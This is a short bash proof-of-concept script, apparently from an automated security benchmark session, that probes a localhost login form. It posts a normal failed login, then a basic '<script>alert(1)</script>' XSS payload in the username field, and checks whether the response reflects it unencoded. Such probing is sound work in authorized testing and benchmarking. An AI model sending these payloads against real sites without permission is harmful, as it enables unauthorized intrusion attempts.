#!/bin/bash
# POC: Debug script to analyze actual login form response format and payload reflection
# Target: ./repo
# Created: 2025-11-07T18:11:48.998Z
# Session: benchmark-XBEN-022-24-mhp5xc5o

# Debug POC - Check actual response format
TARGET_URL="${1:-http://localhost:80/login}"

echo "[*] Debugging login form response..."
echo ""

# First, let's see what a normal failed login looks like
echo "[TEST 1] Normal login attempt to see response structure..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "username=normaluser&password=wrongpass" -v 2>&1)
echo "Response contains:"
echo "$RESPONSE" | head -50
echo ""
echo "---"
echo ""

# Now try with XSS payload
echo "[TEST 2] XSS payload attempt..."
XSS_PAYLOAD='<script>alert(1)</script>'
RESPONSE_XSS=$(curl -s -X POST "$TARGET_URL" -d "username=$XSS_PAYLOAD&password=test" -v 2>&1)
echo "Response with XSS payload:"
echo "$RESPONSE_XSS" | head -100
echo ""

# Check for various indicators
echo "[TEST 3] Checking for payload presence..."
if echo "$RESPONSE_XSS" | grep -i "script" > /dev/null; then
    echo "[+] Found 'script' in response"
fi

if echo "$RESPONSE_XSS" | grep -i "alert" > /dev/null; then
    echo "[+] Found 'alert' in response"
fi

if echo "$RESPONSE_XSS" | grep "&lt;" > /dev/null; then
    echo "[*] Found HTML entities (encoding detected)"
fi

if echo "$RESPONSE_XSS" | grep "<b>" > /dev/null; then
    echo "[+] Found unencoded HTML tags"
fi

echo ""
echo "[*] Full response for manual analysis:"
echo "$RESPONSE_XSS"